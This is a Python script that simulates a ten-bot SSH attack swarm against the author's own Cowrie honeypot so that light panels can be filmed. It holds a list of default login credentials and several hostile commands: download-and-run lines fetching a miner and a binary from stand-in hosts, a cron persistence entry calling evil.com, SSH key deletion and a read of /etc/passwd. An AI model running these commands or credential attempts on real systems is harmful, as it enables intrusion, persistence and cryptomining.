import time
import threading
import paramiko

# ==========================================
# SWARM CONFIGURATION (PLACEHOLDERS)
# ==========================================
TARGET_IP = "198.51.100.1"  # Replace with honeypot public IP (hits iptables -> Cowrie)
TARGET_PORT = 22            # Public SSH port redirected to Cowrie via iptables
NUM_BOTS = 10     # One bot per physical Govee panel
HOLD_TIME = 15    # Seconds to hold sessions open simultaneously for camera

# Realistic botnet credential wordlist
BOT_CREDENTIALS = [
    ("root", "root"),
    ("admin", "admin123"),
    ("ftpuser", "123456"),
    ("support", "support"),
    ("ubuntu", "ubuntu"),
    ("test", "test"),
    ("oracle", "oracle"),
    ("user", "user123"),
    ("guest", "guest"),
    ("operator", "operator1")
]

# Common botnet reconnaissance and persistence payloads
BOT_COMMANDS = [
    "uname -a; lscpu",
    "cat /proc/cpuinfo | grep 'model name' | wc -l",
    "cd ~; chattr -ia .ssh; rm -rf .ssh; mkdir .ssh",
    "cat /etc/passwd | grep -E '(sh$|bash$)'",
    "curl -s http://198.51.100.24/miner.sh | bash",
    "wget http://203.0.113.12/arm7; chmod +x arm7; ./arm7",
    "netstat -tulnp | grep -E ':(22|23|80|443)'",
    "ps aux | grep -v '\[.*\]' | head -n 20",
    "crontab -l; echo '* * * * * curl evil.com/cron' >> /tmp/cron",
    "free -m; df -h"
]


def simulate_attacker(bot_id, username, password, command, stagger_delay):
    """
    Simulates a distinct attacker session:
    1. Delays entry to create a visible staggered wave across panels.
    2. Connects on port 22 (Triggers Cyan on panel).
    3. Authenticates (Triggers Crimson Red on panel).
    4. Executes malicious commands (Triggers Deep Purple on panel).
    5. Holds session open so all 10 panels remain lit for video B-roll.
    6. Closes session (Triggers panel clear/fade).
    """
    time.sleep(stagger_delay)
    print(f"[*] [Bot {bot_id:>2}] Initiating attack from simulated node... ({username}:{password})")

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Step 1: Ingress & Authentication (Hits iptables -> Cowrie)
        client.connect(
            hostname=TARGET_IP,
            port=TARGET_PORT,
            username=username,
            password=password,
            timeout=10,
            banner_timeout=10,
            allow_agent=False,
            look_for_keys=False
        )
        print(f"[+] [Bot {bot_id:>2}] AUTHENTICATED -> Panel [{bot_id}] active (Crimson Red)")

        # Step 2: Command Execution (Triggers Execution State / Purple)
        time.sleep(1.5)  # Brief pause so the red flash registers
        print(f"[!] [Bot {bot_id:>2}] Executing: {command}")
        stdin, stdout, stderr = client.exec_command(command, timeout=5)
        _ = stdout.read()  # Drain buffer

        # Step 3: Hold Session for Video Footage
        print(f"[#] [Bot {bot_id:>2}] Holding active session for {HOLD_TIME}s...")
        time.sleep(HOLD_TIME)

    except paramiko.AuthenticationException:
        print(f"[-] [Bot {bot_id:>2}] Auth failed (still logged by Cowrie).")
    except Exception as e:
        print(f"[!] [Bot {bot_id:>2}] Session error: {e}")
    finally:
        client.close()
        print(f"[-] [Bot {bot_id:>2}] Session closed -> Panel [{bot_id}] clearing.")


def run_swarm():
    print("==================================================")
    print("      HONEYPOT MULTI-ATTACKER SWARM SIMULATOR     ")
    print(f" Target Host: {TARGET_IP}:{TARGET_PORT}           ")
    print(f" Bot Threads: {NUM_BOTS} Concurrent Sessions      ")
    print(f" Camera Hold: {HOLD_TIME} Seconds                  ")
    print("==================================================\n")

    threads = []
    # Stagger connections by 0.75s so the panels light up in a domino wave
    for i in range(NUM_BOTS):
        user, pwd = BOT_CREDENTIALS[i % len(BOT_CREDENTIALS)]
        cmd = BOT_COMMANDS[i % len(BOT_COMMANDS)]
        stagger = i * 0.75

        t = threading.Thread(
            target=simulate_attacker,
            args=(i + 1, user, pwd, cmd, stagger),
            name=f"BotThread-{i+1}"
        )
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print("\n[+] Swarm simulation complete. All 10 panels cycled.")


if __name__ == "__main__":
    run_swarm()